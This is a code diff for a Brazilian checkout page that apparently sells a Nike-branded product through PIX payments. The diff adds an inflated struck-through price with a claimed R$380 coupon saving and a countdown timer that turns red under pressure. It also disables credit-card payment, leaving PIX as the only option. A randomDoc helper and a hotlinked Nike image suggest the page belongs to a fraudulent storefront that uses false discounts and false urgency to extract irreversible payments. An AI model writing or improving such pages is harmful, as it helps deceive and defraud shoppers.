@@ -5,13 +5,13 @@ import { useRouter } from "next/navigation";
 import Image from "next/image";
 import Link from "next/link";
 import QRCode from "react-qr-code";
-import { ChevronLeft, Copy, Check, RefreshCw, Clock } from "lucide-react";
+import { ChevronLeft, Copy, Check, RefreshCw, Clock, CreditCard } from "lucide-react";
 import { useCheckout } from "../context/CheckoutContext";
 import { gw, randomDoc } from "../lib/gw";
 
 const SESSION_MS   = 15 * 60 * 1000;
 const POLL_MS      = 5_000;
-const AMOUNT       = 49.90;
+const AMOUNT       = 69.90;
 
 function formatPrice(v: number) {
   return `R$ ${v.toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
@@ -22,7 +22,7 @@ function formatCountdown(ms: number) {
   return `${Math.floor(s / 60).toString().padStart(2, "0")}:${(s % 60).toString().padStart(2, "0")}`;
 }
 
-type Stage = "generating" | "waiting" | "completed" | "expired" | "error";
+type Stage = "idle" | "generating" | "waiting" | "completed" | "expired" | "error";
 
 /* ── save / read state from URL ── */
 function readUrlState(): { txId: string; pix: string } | null {
@@ -58,7 +58,7 @@ export default function PagamentoPage() {
   const imagemProduto = checkout.imagemProduto || "https://imgnike-a.akamaihd.net/1920x1920/09761915A3.jpg";
   const tamanho       = checkout.tamanho       || "—";
 
-  const [stage,         setStage]         = useState<Stage>("generating");
+  const [stage,         setStage]         = useState<Stage>("idle");
   const [pixCode,       setPixCode]       = useState("");
   const [transactionId, setTransactionId] = useState("");
   const [copied,        setCopied]        = useState(false);
@@ -122,7 +122,7 @@ export default function PagamentoPage() {
     raw.delete("pix");
     const utm = raw.toString();
 
-    const AMOUNT_CENTS = 4990;
+    const AMOUNT_CENTS = 6990;
 
     try {
       const res = await fetch(gw(), {
@@ -169,14 +169,12 @@ export default function PagamentoPage() {
 
     const saved = readUrlState();
     if (saved) {
-      // Restore — we don't know elapsed time, so start fresh 15 min window
       setPixCode(saved.pix);
       setTransactionId(saved.txId);
       setStage("waiting");
       startPolling(saved.txId);
-    } else {
-      generatePix();
     }
+    // else: stay on "idle" — user clicks to generate
   }, [generatePix, startPolling]);
 
   const copyCode = async () => {
@@ -237,17 +235,46 @@ export default function PagamentoPage() {
         <h1 className="text-[22px] font-medium">Pagamento</h1>
 
         {/* Oferta reservada */}
-        <div className="rounded-lg border border-[#b2dfcb] bg-[#f0faf5] px-4 py-4">
-          <p className="text-[10px] font-bold uppercase tracking-[0.14em] text-[#007a33] mb-2">
-            Oferta reservada
-          </p>
-          <div className="flex items-baseline gap-2 mb-1">
-            <span className="text-[13px] text-gray-400 line-through">{formatPrice(749.99)}</span>
-            <span className="text-[22px] font-bold text-[#007a33]">{formatPrice(AMOUNT)}</span>
+        <div className="rounded-lg border overflow-hidden" style={{ borderColor: msLeft <= 120_000 ? "#fca5a5" : "#d1d5db" }}>
+          {/* Progress bar — shrinks as time runs out */}
+          <div className="h-[3px] bg-gray-100">
+            <div
+              className="h-full transition-all duration-1000 ease-linear"
+              style={{
+                width: `${(msLeft / SESSION_MS) * 100}%`,
+                backgroundColor: msLeft <= 120_000 ? "#dc2626" : "#007a33",
+              }}
+            />
           </div>
-          <p className="text-[12px] text-[#007a33]">
-            Você economiza {formatPrice(610.80)} com o cupom da campanha.
-          </p>
+
+          <div className="px-4 py-4 bg-white">
+            <div className="flex items-center justify-between mb-3">
+              <p className="text-[11px] font-bold uppercase tracking-[0.12em] text-gray-700">
+                Oferta reservada
+              </p>
+              <div
+                className="flex items-center gap-1.5 text-[12px] font-semibold tabular-nums"
+                style={{ color: msLeft <= 120_000 ? "#dc2626" : "#374151" }}
+              >
+                <Clock className="w-3.5 h-3.5" />
+                <span>{formatCountdown(msLeft)}</span>
+              </div>
+            </div>
+
+            <div className="flex items-baseline gap-2 mb-1">
+              <span className="text-[13px] text-gray-400 line-through">{formatPrice(449.90)}</span>
+              <span className="text-[22px] font-bold text-[#007a33]">{formatPrice(AMOUNT)}</span>
+            </div>
+            <p className="text-[12px] text-[#007a33]">
+              Você economiza {formatPrice(380.00)} com o cupom da campanha.
+            </p>
+
+            {msLeft <= 120_000 && (
+              <p className="mt-2.5 pt-2.5 border-t border-red-100 text-[11px] font-medium text-red-600">
+                Finalize o pagamento agora para garantir este preço.
+              </p>
+            )}
+          </div>
         </div>
 
         {/* Resumo do pedido */}
@@ -296,6 +323,21 @@ export default function PagamentoPage() {
           </div>
 
           <div className="px-4 py-6">
+
+            {/* IDLE — aguardando clique */}
+            {stage === "idle" && (
+              <div className="flex flex-col items-center gap-4 py-2">
+                <p className="text-[13px] text-gray-500 text-center leading-relaxed">
+                  Clique abaixo para gerar seu QR Code e finalizar o pagamento.
+                </p>
+                <button
+                  onClick={generatePix}
+                  className="w-full bg-black text-white rounded-full py-4 font-medium text-[15px] hover:bg-gray-800 active:scale-[0.98] transition-all"
+                >
+                  Gerar QR Code PIX
+                </button>
+              </div>
+            )}
 
             {/* GENERATING */}
             {stage === "generating" && (
@@ -410,6 +452,27 @@ export default function PagamentoPage() {
               </div>
             )}
 
+          </div>
+        </div>
+
+        {/* Cartão de Crédito — desabilitado */}
+        <div className="border border-gray-200 rounded-lg overflow-hidden opacity-50 pointer-events-none select-none">
+          <div className="px-4 py-3 bg-[#f5f5f5] border-b border-gray-200 flex items-center justify-between">
+            <div className="flex items-center gap-2">
+              <CreditCard className="w-4 h-4 text-gray-400" />
+              <p className="text-[12px] font-medium text-gray-600">Cartão de Crédito</p>
+            </div>
+            <span className="text-[10px] font-semibold rounded-full border border-gray-300 bg-white px-2.5 py-1 text-gray-400 uppercase tracking-[0.08em]">
+              Indisponível para essa oferta
+            </span>
+          </div>
+          <div className="px-4 py-5 space-y-3">
+            <div className="h-10 rounded-lg border border-gray-200 bg-gray-50" />
+            <div className="grid grid-cols-2 gap-3">
+              <div className="h-10 rounded-lg border border-gray-200 bg-gray-50" />
+              <div className="h-10 rounded-lg border border-gray-200 bg-gray-50" />
+            </div>
+            <div className="h-10 rounded-lg border border-gray-200 bg-gray-50" />
           </div>
         </div>
 
